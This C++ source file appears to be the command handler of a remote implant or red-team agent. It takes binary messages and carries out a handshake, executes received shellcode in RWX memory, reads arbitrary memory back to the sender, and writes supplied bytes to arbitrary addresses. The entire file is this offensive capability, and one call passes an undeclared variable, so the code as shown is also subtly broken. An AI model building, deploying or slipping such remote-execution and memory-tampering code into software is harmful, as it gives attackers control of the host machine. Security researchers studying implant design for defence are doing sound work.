#include "global.hpp"
#include <stdint.h>
#ifdef DEBUG
#include <iostream>
using namespace std;
#endif
typedef unsigned long long (*ShellcodeFunc)();
size_t createHandshake(char* resp, size_t respMax, void* scratchpad);

bool handleMessage(
    const char* input,
    size_t inputSize,
    char* output,
    size_t outputCapacity,
    size_t& outputSize,
    PVOID execution_mem
) {
    if (inputSize == 0) {
        outputSize = 0;
        return false;
    }

    uint8_t type = (uint8_t)input[0];
    outputSize = 0; // Initialize size

    switch (type) {
        case 0x00: { // Handshake
            output[0] = 0x00 ; // Success indicator
            outputSize = createHandshake(output+1, outputCapacity-1, scratchpad)+1;
            return true;
        }

        case 0x01: { // Execute Shellcode
            // Format: [Type 0x01][8-byte size][Shellcode Bytes]
            if (inputSize < 9) return false;
            uint64_t sc_size = *(uint64_t*)(input + 1);
            
            if (inputSize < (9 + sc_size)) return false;

            // Copy and Execute (Assumes 'execution_mem' is pre-allocated with RWX)
            memcpy(execution_mem, input + 9, (size_t)sc_size);
            ShellcodeFunc exec = (ShellcodeFunc)execution_mem;
            #ifdef DEBUG
            cout << "Executing " << (hex) << (unsigned long long) execution_mem << ". Size " << sc_size << endl;
            #endif
            uint64_t result = exec();

            // Format response: [Type 0x01][8-byte result]
            if (outputCapacity < 9) return false;
            output[0] = 0x01;
            memcpy(output + 1, &result, 8);
            outputSize = 9;
            return true;
        }

        case 0x02: { // Read Memory
            // Format: [Type 0x02][8-byte addr][8-byte len]
            if (inputSize < 17) return false;
            uint64_t startAddr = *(uint64_t*)(input + 1);
            uint64_t readLen = *(uint64_t*)(input + 9);

            // Bounds Check
            if (readLen + 1 > outputCapacity) readLen = outputCapacity - 1;

            output[0] = 0x01; // Success indicator
            // Caution: Arbitrary read can cause access violation (0xC0000005)
            // Use IsBadReadPtr or __try/__except in real assessments
            #ifdef DEBUG
            cout << "Reading from " << (hex) << (unsigned long long) startAddr << ". Size " << readLen << endl;
            #endif 
            memcpy(output + 1, (void*)startAddr, (size_t)readLen);
            outputSize = (size_t)readLen + 1;
            return true;
        }

        case 0x03: { // Write Memory
            // Format: [Type 0x03][8-byte addr][8-byte len][Data...]
            if (inputSize < 17) return false;
            uint64_t writeAddr = *(uint64_t*)(input + 1);
            uint64_t writeLen = *(uint64_t*)(input + 9);

            if (inputSize < (17 + writeLen)) return false;
            #ifdef DEBUG
            cout << "Writing to " << (hex) << (unsigned long long) writeAddr << ". Size " << writeLen << endl;
            #endif
            // Perform the write
            memcpy((void*)writeAddr, input + 17, (size_t)writeLen);

            if (outputCapacity < 1) return false;
            output[0] = 0x01; // Success
            outputSize = 1;
            return true;
        }

        default:
            break;
    }

    return false; // Unknown type or error
}